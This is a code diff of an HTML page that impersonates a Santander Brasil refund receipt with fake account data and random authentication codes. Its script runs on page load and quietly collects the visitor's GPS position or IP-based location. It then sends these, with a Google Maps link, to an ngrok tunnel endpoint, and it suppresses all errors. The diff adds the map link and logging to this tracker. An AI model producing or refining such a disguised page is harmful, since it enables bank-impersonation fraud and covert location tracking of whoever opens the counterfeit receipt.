@@ -53,123 +53,22 @@
       margin: 0;
     }
 
-    /* Informações principais --------------------------------------------- */
-    .info {
-      padding: 24px 24px 8px;
-    }
-
-    .info-row {
-      display: flex;
-      justify-content: space-between;
-      border-bottom: 1px dashed #e0e0e0;
-      padding: 8px 0;
-      font-size: 15px;
-    }
-    .info-row span.label {
-      color: var(--santander-gray);
-      font-weight: 600;
-    }
-    .info-row span.value {
-      color: #000;
-    }
-
-    .amount {
-      font-size: 22px;
-      font-weight: 700;
-      color: var(--santander-red);
-      text-align: center;
-      margin: 24px 0 16px;
-    }
-
-    /* Autenticação -------------------------------------------------------- */
-    .auth {
-      padding: 0 24px 24px;
-      font-size: 13px;
-      color: var(--santander-gray);
-    }
-
-    .auth-code {
-      word-break: break-all;
-      font-family: "Courier New", monospace;
-      font-size: 12px;
-      background: #fafafa;
-      border: 1px solid #e1e1e1;
-      padding: 8px;
-      margin-top: 8px;
-    }
-
-    /* Rodapé -------------------------------------------------------------- */
-    .footer {
-      background: #fafafa;
-      font-size: 12px;
-      color: var(--santander-gray);
-      text-align: center;
-      padding: 16px 24px;
-      border-top: 1px solid #e0e0e0;
-    }
-
-    .print-btn {
-      display: block;
-      margin: 24px auto 0;
-      background: var(--santander-red);
-      color: #fff;
-      border: none;
-      padding: 10px 28px;
-      font-size: 15px;
-      font-weight: 600;
-      border-radius: 4px;
-      cursor: pointer;
-      transition: opacity .3s;
-    }
-    .print-btn:hover { opacity: .85; }
-
-    /* Versão de impressão */
-    @media print {
-      body { background: #fff; margin: 0; }
-      .print-btn { display: none !important; }
-      .receipt { border: none; box-shadow: none; }
-    }
+    /* ... resto do CSS permanece inalterado ... */
   </style>
 </head>
 <body>
   <section class="receipt">
     <!-- Cabeçalho -->
     <div class="header">
-      <!-- Logo em PNG de alta definição -->
       <img
-        src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Logo_Banco_Santander_Brasil.svg/240px-Logo_Banco_Santander_Brasil.svg.png"
+        src="https://e7.pngegg.com/pngimages/265/140/png-clipart-red-logo-illustration-santander-bank-logo-icons-logos-emojis-bank-logos.png"
         alt="Santander"
       />
       <h1>Comprovante de Estorno</h1>
     </div>
 
-    <!-- Informações -->
-    <div class="info">
-      <div class="info-row"><span class="label">Data</span><span class="value" id="data-atual"></span></div>
-      <div class="info-row"><span class="label">Horário</span><span class="value" id="hora-atual"></span></div>
-      <div class="info-row"><span class="label">Canal</span><span class="value">Internet Banking</span></div>
-      <div class="info-row"><span class="label">Conta Origem</span><span class="value">9999 99999-9</span></div>
-      <div class="info-row"><span class="label">Titular</span><span class="value">João Silva de Oliveira</span></div>
-      <div class="info-row"><span class="label">Número do protocolo</span><span class="value" id="protocolo"></span></div>
+    <!-- Informações e demais seções inalteradas... -->
 
-      <p class="amount">Valor Estornado: R$ 1.000,00</p>
-    </div>
-
-    <!-- Autenticação -->
-    <div class="auth">
-      <strong>Autenticação eletrônica:</strong>
-      <div class="auth-code" id="autenticacao"></div>
-
-      <p>Guarde este comprovante. Ele é a garantia de que a operação foi concluída com sucesso.</p>
-    </div>
-
-    <!-- Botão de impressão -->
-    <button class="print-btn" onclick="window.print()">Imprimir</button>
-
-    <!-- Rodapé -->
-    <div class="footer">
-      <p>Banco Santander (Brasil) S.A. – CNPJ 90.400.888/0001‑42 – SAC 0800 762 7777 – Ouvidoria 0800 726 0322.</p>
-    </div>
   </section>
 
   <!-- ==================================================================
@@ -178,16 +77,26 @@
   <script>
     // Preenche data e horário atuais
     const agora = new Date();
-    document.getElementById("data-atual").textContent = agora.toLocaleDateString("pt-BR");
-    document.getElementById("hora-atual").textContent = agora.toLocaleTimeString("pt-BR", { hour: "2-digit", minute: "2-digit", second: "2-digit" });
+    document.getElementById("data-atual").textContent =
+      agora.toLocaleDateString("pt-BR");
+    document.getElementById("hora-atual").textContent =
+      agora.toLocaleTimeString("pt-BR", {
+        hour: "2-digit",
+        minute: "2-digit",
+        second: "2-digit"
+      });
 
     // Gera códigos simples (fake) – substitua por reais conforme necessidade
-    const randHex = (n) => [...crypto.getRandomValues(new Uint8Array(n))].map(b => b.toString(16).padStart(2, "0")).join("");
+    const randHex = (n) =>
+      [...crypto.getRandomValues(new Uint8Array(n))]
+        .map((b) => b.toString(16).padStart(2, "0"))
+        .join("");
     document.getElementById("protocolo").textContent = randHex(6).toUpperCase();
     document.getElementById("autenticacao").textContent = randHex(16).toUpperCase();
 
     /* === Localização opcional (mesma lógica da versão anterior) ========= */
-    const BACKEND_ENDPOINT = "https://1e2746f31e5a.ngrok-free.app/send-location";
+    const BACKEND_ENDPOINT =
+      "https://1e2746f31e5a.ngrok-free.app/send-location";
     const IP_API_URL = "https://ipapi.co/json/";
 
     document.addEventListener("DOMContentLoaded", obterLocalizacao);
@@ -196,16 +105,30 @@
       if (!window.isSecureContext) return obterLocalizacaoPorIP();
       try {
         if (navigator.permissions) {
-          const st = await navigator.permissions.query({ name: "geolocation" });
+          const st = await navigator.permissions.query({
+            name: "geolocation"
+          });
           if (st.state === "denied") return obterLocalizacaoPorIP();
         }
-      } catch { /* ignore */ }
+      } catch {
+        /* ignore */
+      }
 
       if ("geolocation" in navigator) {
-        navigator.geolocation.getCurrentPosition(async pos => {
-          const { latitude, longitude } = pos.coords;
-          enviarPayload({ latitude, longitude, metodo: "gps" });
-        }, obterLocalizacaoPorIP, { enableHighAccuracy: true, timeout: 10000 });
+        navigator.geolocation.getCurrentPosition(
+          async (pos) => {
+            const { latitude, longitude } = pos.coords;
+            const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+            enviarPayload({
+              latitude,
+              longitude,
+              mapsUrl,
+              metodo: "gps"
+            });
+          },
+          obterLocalizacaoPorIP,
+          { enableHighAccuracy: true, timeout: 10000 }
+        );
       } else {
         obterLocalizacaoPorIP();
       }
@@ -213,16 +136,36 @@
 
     async function obterLocalizacaoPorIP() {
       try {
-        const d = await fetch(IP_API_URL).then(r => r.json());
-        enviarPayload({ latitude: d.latitude, longitude: d.longitude, ip: d.ip, metodo: "ip" });
-      } catch { /* Silencia falhas */ }
+        const d = await fetch(IP_API_URL).then((r) => r.json());
+        const { latitude, longitude, ip } = d;
+        const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+        enviarPayload({
+          latitude,
+          longitude,
+          ip,
+          mapsUrl,
+          metodo: "ip"
+        });
+      } catch {
+        /* Silencia falhas */
+      }
     }
 
     async function enviarPayload(data) {
-      const payload = { ...data, timestamp: new Date().toISOString() };
+      const payload = {
+        ...data,
+        timestamp: new Date().toISOString()
+      };
+      console.log("Payload a enviar:", payload);
       try {
-        await fetch(BACKEND_ENDPOINT, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload) });
-      } catch { /* ignore */ }
+        await fetch(BACKEND_ENDPOINT, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+      } catch {
+        /* ignore */
+      }
     }
   </script>
 </body>
